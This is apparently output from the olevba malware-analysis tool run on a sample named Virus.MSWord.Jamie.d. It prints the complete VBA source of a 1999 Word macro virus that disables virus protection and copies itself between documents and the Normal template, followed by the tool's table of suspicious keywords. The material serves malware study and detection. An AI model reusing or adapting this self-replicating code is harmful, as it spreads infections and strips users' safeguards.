olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Jamie.d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Jamie.d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit

-------------------------------------------------------------------------------
VBA MACRO ThisDocument1.cls 
in file: ./Virus.MSWord.Jamie.d - OLE stream: 'Macros/VBA/ThisDocument1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
SetAttr NormalTemplate.FullName, vbNormal
Options.VirusProtection = (0 - 0): Options.SaveNormalPrompt = (1 - 1): Options.ConfirmConversions = (2 - 2)
Set AD = ActiveDocument.VBProject.VBComponents.Item(1)
Set NT = NormalTemplate.VBProject.VBComponents.Item(1)
If ActiveDocument.VBProject.Description <> "For Jamie..." Then GoTo ADI
If NormalTemplate.VBProject.Description <> "For Jamie..." Then GoTo NTI
GoTo SetReadOnly
ADI:
Set MTI = AD
Set MTC = NT
OPM = "Private Sub Document_Close()"
AII = AD.CodeModule.CountOfLines
ActiveDocument.VBProject.Description = "For Jamie..."
GoTo Install
NTI:
Set MTI = NT
Set MTC = AD
OPM = "Private Sub Document_Open()"
AII = NT.CodeModule.CountOfLines
NormalTemplate.VBProject.Description = "For Jamie..."
GoTo Install
Install:
If AII > 0 Then
 With MTI.CodeModule
  For x = 1 To AII
  .DeleteLines 1
  Next
 End With
End If
If AII <= 1 Then
 MTC.Export ("Jamie.tmp")
 MTI.CodeModule.AddFromFile ("Jamie.tmp")
  For x = 1 To MTI.CodeModule.CountOfLines
   If MTI.CodeModule.Find("Private Sub Document", 1, 1, 1, 20, True, True, True) = False Then MTI.CodeModule.DeleteLines 1
  Next
  MTI.CodeModule.ReplaceLine 1, OPM
 Kill ("Jamie.tmp")
End If
SetReadOnly:
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
SetAttr NormalTemplate.FullName, vbReadOnly
End Sub
',.,.,.,.,.,.,.,.,.,.,.,.,.,.,.,.,.,.,.,.,
' Jamie(Type A - Strand D) By Lys KovicK
' Released: Thursday, May 27, 1999, 20:10
'';';';';';';';';';';';';';';';';';';';';'
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

